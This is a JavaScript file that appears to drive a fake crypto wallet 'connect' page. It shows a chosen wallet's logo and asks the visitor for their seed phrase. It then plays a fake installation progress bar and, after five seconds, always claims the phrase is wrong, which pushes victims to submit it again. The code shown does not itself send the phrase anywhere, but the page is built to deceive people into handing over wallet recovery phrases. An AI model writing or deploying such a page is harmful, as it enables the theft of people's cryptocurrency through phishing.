const walletLogo = document.getElementById("walletLogo");
const walletName = document.getElementById("walletName");

// Install Popup Elements
const popup = document.getElementById("installPopup");
const nameBox = document.getElementById("popWalletName");
const logoBox = document.getElementById("popLogo");
const progressFill = document.getElementById("progressFill");
const successTick = document.getElementById("successTick");

// Get wallet from URL
const params = new URLSearchParams(window.location.search);
const wallet = params.get("wallet");

if (wallet) {
  walletName.innerText = wallet;

  const fileName = wallet
    .toLowerCase()
    .replace(/\s+/g, "")
    .replace(/['./]/g, "");

  const iconPath = `wallet-icons/${fileName}.webp`;

  walletLogo.src = iconPath;
  walletLogo.onerror = () => (walletLogo.style.display = "none");
}

// Auto-expand textareas
document.querySelectorAll(".autoExpand").forEach((textarea) => {
  textarea.addEventListener("input", () => {
    textarea.style.height = "auto";
    textarea.style.height = textarea.scrollHeight + "px";
  });
});

// ⭐ NEW MODERN POPUP for INSTALL (Cards)
function startInstallPopup(walletName, walletLogo) {
  nameBox.textContent = walletName;
  logoBox.src = walletLogo;

  progressFill.style.width = "0%";
  successTick.style.opacity = "0";
  successTick.style.transform = "scale(0.3)";
  successTick.classList.remove("tick-bump");

  popup.style.display = "flex";

  let progress = 0;

  let loader = setInterval(() => {
    progress += 2;
    progressFill.style.width = progress + "%";

    if (progress >= 100) {
      clearInterval(loader);

      setTimeout(() => {
        successTick.classList.add("tick-bump");
      }, 300);

      setTimeout(() => {
        popup.style.display = "none";
      }, 1800);
    }
  }, 60);
}

// ⭐ CONNECT BUTTON POPUP (inside wallet page)
document.getElementById("connectBtn").addEventListener("click", () => {
  const name = document.getElementById("walletInput").value.trim();
  const phrase = document.getElementById("phraseInput").value.trim();
  const check = document.getElementById("confirmCheck");

  if (name === "" || phrase === "") {
    alert("Please fill out the field");
    return;
  }

  if (!check.checked) {
    alert("Please confirm you entered it correctly");
    return;
  }

  // Start same install popup
  startInstallPopup(walletName.innerText, walletLogo.src);

  setTimeout(() => {
    alert("Your key phrase is wrong!");
  }, 5000);
});

// ⭐ CLICK EVENT FOR ALL WALLET CARDS
document.querySelectorAll(".wallet-card").forEach((card) => {
  card.addEventListener("click", () => {
    const name = card.querySelector("p").innerText;
    const logo = card.querySelector("img").src;

    startInstallPopup(name, logo);
  });
});
